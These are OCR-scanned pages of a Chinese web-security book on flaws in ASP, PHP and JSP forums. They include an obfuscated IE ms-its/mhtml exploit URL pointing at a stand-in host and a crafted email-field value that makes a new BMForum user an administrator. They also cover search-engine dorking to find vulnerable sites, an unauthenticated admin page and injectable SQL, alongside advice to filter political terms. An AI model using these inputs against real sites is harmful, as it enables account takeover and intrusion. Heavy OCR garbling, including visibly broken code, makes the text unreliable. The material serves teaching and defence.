这些资料与其他浏览者交流或者与网站管理者交流。面交互的特点，正是漏洞形成的一大原因，
因为用户输入信息是不可预测的，如果程序没有考虑到一些安全间题，用户输入就有可能成为
攻击事件，不管有意还是无意。
在部分传统程序员眼中，网页程序设计人员其实不能称为程序员，他们认为网页程序设计，
只需要美工好就可以了，完全没有技巧可言，之所以形成这种观点，有几个原因。一是网页编
程相对比较简单，变化较少，基本上，网页编程可以很简单地概括出几个类型：留言板、论坛、
聊天室、邮件列表、新闻发布、软件下载等，面这些类型的编程，大部分都有模式可循，与传
统编程相比，的确比较简单，可任意掌握：二是网页编程人员大部分半道出家，专业的程序员
相对较少，编程的系统训练较少，可能编程的基础也比较弱，所以，编程方面可能还是有一些
缺陷的：三是部分人直接下载网上的免费程序来建立网站，这些程序的健壮性、安全性都没有
严格考虑，如果网站采用者不自己修改这些程序而直接照搬的话，很可能存在严重安全问题。
---
## Page 77
网络安全进阶笔记
网页编程相对比较简单，漏洞形成的例子显然很多，但是，都有一些内在的共同点可以寻找，
以此归纳出一些共同的特点，供大家参考。
（1）用户输入验证不全面。在几乎所有安全的网络程序中，第一道防线就是检查用户所接
收到的每一条数据。这与防火墙保护计算机的原理很类似：它不能预防所有的攻击，但它可以
让一个程序更加稳定。这个过程叫作检查、验证或者过滤您的输入，一个明显的问题是，在何
处执行检查？是在数据最初进入程序时，或者是在一个低层次的例程，在实际使用这些数据
时？通常，最好在这两处都对其进行检查：这样，即使一个攻击者成功地突破了一道防线，他
还会遇到另一条。最重要的规则是所有的数据必须在使用之前被检查。
小技巧：总结用户输入验证，应该包括以下儿个方面，首先是输入信息长度验证，如来用户输
入的信息达到几个MB，而我们的程序又没有验证长度的话，可以想到的危害就有：
程序验证出错：变量占用大量内存，出现内存溢出，至使服务器服务停止甚至关机
其次，输入信息敏感字符检查，比如在设计留言核的时候，我们会将“等符号的
信息去除，以免用户留下页面炸弹，但是，是否这些就已经足够了呢？还选远不够，
如留言板内容信息的过滤、用户名信息的过滤、Email信息的验证、搜索信息的验证，
都要考虑进行验证！例外，特别提醒：那些从网上下载回来的程序，一般不造宜于直
接使用，因为它们的源代码都可以被所有人知道，安全性当然不是很好，在这种情况
下，我们一般验证一些常见的用于数据库操作的语句，必然搜索信息是否含有Select
等，这样来限制用户输入，避免信息的泄露，
（2）内容的检测不严格。一个网站的设计完成，除了技术的完善以外，还需要这个网站在
国家法律法规内发布信息，不能随意让自己的网站成为一些别用心的人发布不法信息的平台。
所以，我们有必要对所有用户输入而且有可能显示给其他用户的信息进行内容检测，一般有几
类：粗话的检测，一般我们检测一些常见的粗话：敏感词汇的检测，必然有“法轮”等这些词：
关系政治的词汇，最好全部过滤，比如“共产党”等：国家领导人的姓名，最好过滤。当然，
以上的一些规则，不一定全部要这样，可以根据自己留言或者论坛的性质来决定哪些需要严格
过滤。
（3）页面行为方式编程不严格。在一般的网站中，注册新用户的时候，一般会首先要求用
户输入自己需要注册的账号信息，以此来验证该账号是否已经存在，确保用户的单一性，如论
坛等注册新用户时的要求。然面，如果编程不谨慎，就容易造成一个很大的漏洞。我们知道，
HTML文件是可以阅读源代码并且也可以直接保存的，如果用户将注册通过的页面保存并且将
上面的账号信息修改为一个已经存在的账号，由于程序认为该账号已经通过检测，于是，直接
将该账号插入数据库，结果，原来拥有该账号的用户就被删除或者信息被修改了，面如果这个
账号刚好是一个管理员账号，结果会怎样呢？
可能我们认为以上的情况很简单，但是以这种方式编程的程序员却很多，随便在网上找，
我们可以找到很多这种方式编程的源代码和已经采用的程序。说到这里，可能很多用户开始怀
疑网络程序的安全性，确实是这样吗？实际上，看看网络上横行的论坛漏洞，无论是ASP、JSP
还是PHP，类似的问题都可能存在。那么，这些安装了相关代码的虚拟主机是如何被入侵的呢？
2.ASP虚拟主机中的代码分析
关于ASP，各种网络和安全杂志上面介绍得很多了，关于它的漏洞也是层出不穷。当然，
58
---
## Page 78
第2章构建个性化的进阶平台
通过ASP，很多普通的菜鸟也摇身转变为大虾，也许，看看五彩缤纷的ASP世界时，我们不
禁要惊呼：网络越来越神奇了。不过，随着网页中加入更多的图片、动画、特效代码，安全与
执行的效率问题却伴随着个性化的页面接睡而来。某日，登录国内某名牌大学的网站，竞然发
现其代码具有攻击性。看得出来，这个站点代码是经过了站长千挑万选的，网站经过改造后才
有了现在的模样，如图2.41所示。
向与
品
图2.41网站首页的木马
根据提示，这是一个典型的BloodhoundExploit.6病毒！面这个间题居然出现在一所大学
的校园网上，可见，日常上网时，轻易相信某些网站只能让自己道受攻击。不过，从另一个角
度来说，强大的动态网页技术使得网页会有非同寻常的变化，Windows的界面、Flash的动态
效果、随风荡漾的水波纹，这些都已经成为网页代码设计者的最爱。但是，“炫耀”这些战果
的同时，我们必须对浏览页面的用户负责：我们必须保证这些代码的安全和执行效率。
打开这个学院的网站地址并查看其网页源代码后，可以判断，这是一个Microsof Intermet
Explorer跨站脚本漏润，用户运行IE时，攻击者可执行任意代码，或者在其他域的网站上读取
并操作数据。比如，它可以诱导受害者去浏览一个像网页一样的HTML文档或者HTML的邮
件信息，通过运行本机域（LocalMachineZone）脚本，攻击者能够利用正在使用IE用户的权限
来执行任意代码、读取或更改其他网站数据，包括读取Cookies或内容以及更改或者创建目录。
其危害性可想而知！再看看，我们会发现，一个恶意网址或邮件信息可能包含类似如下的HTML
地址也就不奇怪了：
ms-_its:mhtml:file://C:\nosuchfile_mhtthttp://www.example.com//exp1oit_chm:
:exploit_html
此URL故意进行了修正避免防病毒软件的检测，这个地址中，HTML和exploithtml的脚
本将会在本机域（Local Machine Zone）的安全环境下执行。这是对于exploithtml的通常惯例，
---
## Page 79
网络安全进阶笔记
或者包含或者下载一个可运行的文档，例如，后门、特洛伊木马、病毒、机器人，或其他恶意
代码。因此，必须注意在HTTP内容检查或防病毒软件中注意加密URL的可能性。
通过这个典型的安全问题，我们应不难理解，病毒不仅仅隐藏在我们平时所使用的应用软
件中，在Web编程过程中，还存在着很多安全隐患。比如，但在以前的ASP版本中，Cookie
为访问者和编程者都提供了方便，并没有提供加密的功能。打开IE浏览器，选择“工具”菜
在弹出的窗口中，就会显示硬盘里的缓存数据，其中就有大量的Cookie文件。
3.PHP代码过滤不严的漏洞
蓝色魔法论坛是一个用PHP编写的论坛，由于注册用户中的一些代码缺陷，如果用户注
册时用个小技巧，就可以将普通用户提升为管理员。首先选择“PoweredbyBMForumPlus!”
这样的独特标志作为关键字，到百度、Google等网站进行搜索，无数的目标凸现在我们眼前。
特征代码越准确，就越容易我到受害者的论坛。
下面，随便挑选一个有漏洞的论坛（类似的版本还有很多），关于这个漏润我们就不详细描
述其原因了，主要缺陷在于过滤不严，通过伪造“”使程序在读用户等级时将之判断为管理员。
单击“注册”按钮，进入注册页面，在填写邮箱地址时，输入test@testcomj0joj0j0joj0j0j0j0|0
001000|0000010，通过认证后，这个刚注册的新用户就变成了管理员。而这个步骤是如此简
单，加上管理员的权限又大，其危害可想面知。进入“管理中心”，就可以看到管理页面了。
在这里，恶意的用户就可以做很多事情了.比如上传文件构造一个Webshell，这确实是一个很
头疼的问题。如图2.42所示的上传文件表单即可由用户直接构建，试想，如果管理员知道自己
的网站可以被别人这么折磨，其表情会有多么难看。
1页页上一要下一页用货
BETE
图2.42蓝色魔法论坛的后台管理界面
关于代码的安全，可以从以下两个角度来分析。
---
## Page 80
三
第2章构建个性化的进阶平台
第一个问题：随时关注其最新安全动态和补丁，以蓝色魔法论坛为例，可以登录其官方站
点http://www.bmforum.com，找到补丁相关的栏目，如http://www.bmforum.com/bmb/forums.php？
forumid-4这个地址，看看论坛最新的补丁，这也是对自己和客户负责的一种行为。一般来说，
论坛代码的普及程度越高，论坛的受攻击可能就越大。众所周知，动网论坛的补丁现在甚至可
以与微软媲美了。如果使用的是动网论坛，就必须随时关注其最新安全动态，可以通过动网的
论坛、安全杂志、安全网站等，这样可以在最快的时间内了解问题所在，并及时进行防范和解
决漏洞问题。除了关注官方补丁，如果对问题比较了解，可以直接进行修补。这样的问题适用
于ASP、JSP、PHP等代码完成的任何站点。
第二个问题：读代码的问题。现在，由于很多论坛的安装十分智能化，很多使用者也懒得
去看代码是如何实现功能的，直接单击“下一步”或者直接上传到服务器上就万事大吉了，这
其实是一个不好的习惯，知其然的同时也要知其所以然，通过仔细阅读并理解代码，才能真正
我到出现间题的地方，比如，在Web程序中，数据库的安全是一个很严肃的问题，很多代码
的编写者意识到了这类问题，并且小心翼翼地对他们认为有问题的地方做了补救，但常见的情
况是要么没有穷尽所有的可疑地点，要么这种补救逻辑上有误。对于一个耐心且噢觉灵敏的攻
击者来说，这种意义上的补教措施和没有任何补救措施没有本质上的区别。
4.JSP论坛中的管理代码缺陷
为了加强实战效果，我们可以到http:/down.chinaz.com/S/5819.asp这个地址下载一个典型
的论坛代码，根据提示，数据源名称为yyForum，用户名为xyworker，密码为999.到百度、
Google等网站搜索一下，我们可以看到，安装这个代码的论坛不少。仔细分析后，可以发现，
用户管理的页面是user_managerjsp文件。首先，我们看看这个系统是如何加强它的代码安全
性的。其中，在代码的开始部分有一个if限制条件，代码的第3行到第10行具体如下：
if ((session.getValue(*UserName*）==nul1)
11(session.getValue(*UserClass*）=anul1)
11（1session.getValue（*UserClass*）.equals（*系统管理员*))）
reaponse.sendRedirect(*err.jap?id-14*);
fuznaoz
8>
其中，session.getValue表示检索出session的值：sendRedirectO执行后，地址栏链接会改
变，相当于客户端又重新发了一个get请求，要服务器传输另一个文件过来。
下面，我们再来看看修改用户信息的文件modifyuser_managerjsp。典型代码如下：
User_Nane -request.getParameter(*name*);
---
## Page 81
网络安全进阶笔记
User_Password-request.getParaneter(*password*);
User_Sign-request.getParameter（*sign*):
...
User_Sign =yy.ex_chinese（User_Sign);
Connection con=yy-getConn();
Statement stmt = con.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE
ReSultSet.CONCUR_READ_ONLY);
sql=update用户表set用户密码-..User_Password，用户性别-.·User_Sex
，用户邮箱-.+Uer_Emai1."，居住地址-..Uner_Addresa+*..手机号码..
+User_Mobile,oicq=.User_Oicq·，出生日期=..User_Birthay
.用户等级-..User_Class..，签名...Uer_Signwhere用户名=.
.+
//out.printin(sql);
stmt.executeUpdate(sql);
out.println（*正在处理您的用户信息，请稍后...
（de.x.-
看看这个文件，我们就好像看到了一个简单的教学文件，现在，假设管理员提交如下地址，
即 http:/www.51**.net/bbs/modifyuser_manager.jsp?modifyid=51，需要查看、修改 ID为 51的用
户的资料（管理员默认的用户ID为51）。问题就出来了。同样的，我们可以通过搜索引擎得到
如下地址，如图2.43所示。
He
图2.43通过搜索获得的论坛管理界面
很明显，这个用户管理文件缺乏认证，即使是普通的用户，甚至包括我们这些搭不上边的
“游客”，也可以直接提交上述请求，从而将其资料一览无余，更让人动心的是，密码也是明
文存储、显示的。htp://www.51dz.net/bbs/modifyuser_managerjsp同样是大开山i门，直到恶意
用户把数据更新的操作执行完毕，重定向到user_managerjsp的时候，管理员才会看见那个显
2
---